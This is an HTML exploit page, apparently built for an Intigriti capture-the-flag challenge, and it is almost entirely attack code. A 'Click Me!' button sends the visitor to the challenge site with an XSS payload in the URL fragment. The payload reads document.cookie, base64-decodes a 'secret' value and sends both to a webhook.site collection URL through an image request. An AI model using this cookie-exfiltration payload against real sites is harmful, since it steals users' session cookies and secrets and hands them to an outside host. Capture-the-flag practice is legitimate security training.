<!DOCTYPE html>
<html>
<head>
    <title>CTF Challenge</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f5f5f5;
        }
        .center-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #4CAF50;
            color: white;
            padding: 20px 40px;
            font-size: 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <a id="clickme" class="center-button" href="#">Click Me!</a>

    <script>
        window.addEventListener('DOMContentLoaded', function() {
            // Get the button
            var button = document.getElementById('clickme');
            
            // When the button is clicked
            button.addEventListener('click', function(e) {
                e.preventDefault();
                
                // This is the XSS payload that will be used in the fragment
                var fragmentXss = '<img src=x onerror="fetch(\'/api/track\', {headers: {\'x-user-ip\': \'(function(){var c=document.cookie;var s=c.includes(\\\'secret=\\\')?c.split(\\\'secret=\\\')[1].split(\\\';\\\')[0]:\\\'\\\';try{var d=atob(s)}catch(e){var d=\\\'\\\'};var i=new Image();i.src=\\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c=\\\'+encodeURIComponent(c)+\\\'&s=\\\'+encodeURIComponent(s)+\\\'&d=\\\'+encodeURIComponent(d)+\\\'&t=\\\'+Date.now();document.body.appendChild(i);})()\'}})" />';
                
                // Redirect to the challenge site with our XSS payload in the fragment
                window.location.href = 'https://challenge-0325.intigriti.io/note/exploit#' + encodeURIComponent(fragmentXss);
            });
        });
    </script>
</body>
</html>
